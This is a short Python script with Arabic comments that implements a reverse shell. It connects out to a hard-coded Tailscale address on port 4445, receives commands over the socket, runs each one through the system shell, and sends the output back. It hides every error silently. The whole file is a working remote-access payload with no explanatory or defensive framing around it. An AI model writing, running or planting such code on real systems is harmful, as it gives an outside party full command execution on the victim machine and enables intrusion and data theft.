import socket
import subprocess

# ضع هنا آيباد Tailscale الخاص بجهاز الاستقبال لديك
RHOST = "100.121.198.68"  
RPORT = 4445

def connect_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        
        while True:
            # استقبال الأمر
            command = s.recv(4096).decode("utf-8", errors="ignore").strip()
            if not command or command.lower() == "exit":
                break
                
            # تنفيذ الأمر محلياً
            proc = subprocess.run(command, shell=True, capture_output=True)
            output = proc.stdout + proc.stderr
            
            if not output:
                output = b"[+] Command executed (No output)\n"
                
            # إرسال النتيجة
            s.sendall(output)
    except Exception:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    connect_shell()
          
